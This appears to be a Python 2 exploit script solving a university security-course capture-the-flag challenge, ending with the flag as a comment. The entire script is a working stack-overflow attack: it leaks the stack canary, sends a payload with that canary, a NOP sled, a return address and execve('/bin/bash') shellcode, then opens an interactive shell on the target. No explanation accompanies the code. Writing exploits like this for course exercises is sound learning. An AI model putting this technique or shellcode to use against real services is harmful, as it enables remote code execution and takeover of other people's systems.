#!/usr/bin/env python2

from socket import *
import struct
import telnetlib
import time

ip = 'secprog.cs.nctu.edu.tw'
port = 10103

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

# try to leak out the stack cookie
soc.send("a"*12 + "\n")
print("send 1")
data = soc.recv(1024)

print([hex(ord(_)) for _ in data])

# get stack cookie
cookie = "\x00" + data[-4:-1]
print([hex(ord(_)) for _ in cookie])

payload = ("a"*12 + cookie +
        "\x90"*12 +
        struct.pack("<I", 0x80486d0) +
        "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" +
        "\n")

soc.send(payload)

print("done")

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

# SECPROG{WhatIsStackGuard?}
